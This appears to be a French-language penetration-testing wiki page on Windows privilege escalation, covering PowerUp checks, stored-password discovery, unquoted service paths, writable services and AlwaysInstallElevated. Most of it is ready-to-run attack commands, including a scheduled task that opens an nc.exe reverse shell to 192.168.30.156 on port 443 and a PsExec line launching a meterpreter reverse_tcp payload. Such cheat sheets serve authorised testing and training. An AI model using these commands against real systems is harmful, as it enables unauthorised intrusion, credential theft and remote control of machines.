---
title: Elévation de priviléges (Windows)
permalink: /Elévation_de_priviléges_(Windows)/
---

# Elévation de priviléges (Windows)


The following elements are based on <http://toshellandback.com/2015/11/24/ms-priv-esc/>

## PowerSploit

Le module [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) de PowerSploit permet de faire la plupart des contrôles ci-dessous de manière complétement automatisée.

```text
Import-Module Privesc
Invoke-AllChecks
```

## Vulnérabilités systèmes

Il est possible de trouver des vulnérabilités non patchées sur le système. L'outil [Windows Exploit Suggester (Tool)](https://github.com/GDSSecurity/Windows-Exploit-Suggester) facilite cette vérification.

## Mot de passes

De nombreux fichiers peuvent contenir des mots de passes sensibles. La suite PowerUp dispose des fonctions suivantes pour trouver certains d'entre eux (tous sont appelés avec Inboke-AllChecks):

```text
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```

Voir [Stored Credentials (Pentestlab)](https://pentestlab.blog/2017/04/19/stored-credentials/).

## Trusted Service Paths

Si le "Service path" d'un service n'est pas mis entre quote il est possible d'effectuer une attaque. Pour l'exemple on considère le Service Path suivant:

``` text
C:\Program Files\Some Folder\Service.exe
```

Windows va essayer d'appeler les programmes suivant, jusqu'à ce que l'un d'eux soit identifé:

``` text
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Ceci peut conduire à une compromission s'il est possible de créer `C:\Program.exe` ou `C:\Program` `Files\Some.exe`

[WMIC](/WMIC "wikilink") peut être utilisé pour contrôler ce point:

``` text
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

On peut utiliser [icacls](/icacls "wikilink") pour vérifier les permissions:

``` text
icacls "C:\Program Files (x86)\Privacyware"
```

On peut ensuite relancer le service:

``` text
sc stop PFNet
sc start PFNet
```

Si on a pas les privilèges pour redémarrer le service, on peut essayer de redémarrer le serveur.

## Modifier un service Windows

Avec de la chance il est possible de modifier un service. L'outil [accesschk](/accesschk "wikilink") peut être utilisé pour vérifier ceci:

``` text
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

On peut regarder les propriétés du service PFNet

``` text
sc qc PFNet
```

Il est parfois possible de changer le binaire lui même.

## AlwaysInstallElevated
Regarder si l'option `AlwaysInstallElevated` est active. Cette option permet à un utilisateur lambda d'installer des logiciels comme s'il disposait des droits systèmes.

``` text
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Voir [Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)

## Alternatives à RunAs

On est parfois dans des situations où on a:

-   Un shell non interactif et non privilégié sur un serveur
-   Le mot de passe administrateur du serveur
-   Pas de possibilité de se connecter à distance avec ce mot de passe

Dans ce cas il est possible d'executer des commandes avec une des méthodes suivantes.

### PsExec

Il faut avoir uploaddé [PsExec](/PsExec "wikilink"). Ensuite on peut exécuter la commande suivante:

``` bash
PsExec \\MACHINE -u user -p password C:\target\encrypted_meterpreter_reverse_tcp_80.exe
```

### schtasks

Il est possible de créer une "scheduled task" et passer le mdp admin sur la ligne de commande.

``` bash
schtasks /create /sc once /tr "nc.exe -e cmd.exe 192.168.30.156 443" /tn MASUPERTACHE /st 00:00:00 /ru user /rp password
schtasks /run /tn MASUPERTACHE
```

## Ressources

### Outils

-   [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) pour identifier des possibilité d'élévation de priviléges.
-   [BypassUAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) pour contourner l'UAC.
-   Attaque [Hot Potato](https://foxglovesecurity.com/2016/01/16/hot-potato/) (MS16-075)
-   [Windows Exploit Suggester (Tool)](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

### Documents

-   [Encylopaedia of Windows Privilege Escalation (Video)](https://www.youtube.com/watch?v=kMG8IsCohHA)
-   [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
-   [All roads lead to SYSTEM (PDF)](https://labs.mwrinfosecurity.com/system/assets/760/original/Windows_Services_-_All_roads_lead_to_SYSTEM.pdf)
-   [Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)
-   [Windows Privilege Escalation Vectors](http://toshellandback.com/2015/11/24/ms-priv-esc/Common)
-   [Abusing Token Privileges For Windows Local Privilege Escalation](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)


